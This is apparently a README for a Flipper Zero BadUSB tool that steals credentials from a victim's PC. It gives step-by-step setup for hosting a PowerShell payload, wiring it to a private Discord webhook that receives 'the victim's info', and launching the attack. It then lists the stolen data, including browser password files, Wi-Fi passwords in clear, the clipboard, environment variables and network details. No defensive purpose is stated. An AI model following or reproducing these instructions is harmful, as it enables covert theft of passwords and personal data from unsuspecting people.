### Stole pc password with the BadUSB mode
* the script does not require any administrator rights

## Installation :
* Step 1: Have a domain name and hosting + a zero flipper
* Step 2: go to my github and get the two files: https://github.com/s4dic/FlipperZero/tree/main/BadUsb/passwordgrabber
* Step 3: Create a Discord server where only you have access ( the server will allow to send the victim's info so be careful: if it's a public server for can be report and ban from discord)
* Step 4: Create a textual channel on the discord you just created then go to the channel settings to create a webhook
* Step 5: Modify the script "payload to upload online.ps1" by changing the URL of the webhook (at the beginning of the script).
* Step 6: Rename the script you just modified with a name following "e" (do not put another name, and the name must be without quotes and without extension), then send your script on hosting, check that your script is accessible with your domainname.com/e
* Step 7: Open the file "mdponly" change the url http://domain.com/e by your URL.
* Step 8: Place the file "mdponly" in your flipper zero in the folder badusb, either in the root of this folder or in a subfolder
* Step 9: Launch the attack (on a vm or on your pc it doesn't matter)

## Demo :
[https://youtu.be/OfgyzUYEPXw](https://youtu.be/OfgyzUYEPXw)

## Data Exfiltrated :
- `PC Name`    - Get the name of PC
- `ClipBoard`  - Get the PC ClipBoard
- `environment variables`  - The environment variables use on the PC
- `PUBLIC IP`  - Get the Public WAN IPv4
- `PRIVATE IP`  - Get the Private LAN IPv4
- `Other network information`  - Other network informations like: Gateway, DNS, DHCP, network card(MAC), IPv6, etc...
- `Installed Software`  - List all installed application on the PC
- `Web Browser Password`  - Get the private file containing web browser password (Works with firefox,Edge & Chrome) (you need copy/past the file to the %appdata% web broser folder to get cleared password)
- `Screen Capture`  - Get a screen capture before the attack begins
- `WIFI Password`  - Get in clear all wifi password stored (if pc don't have a wifi password you get a blank txt file)
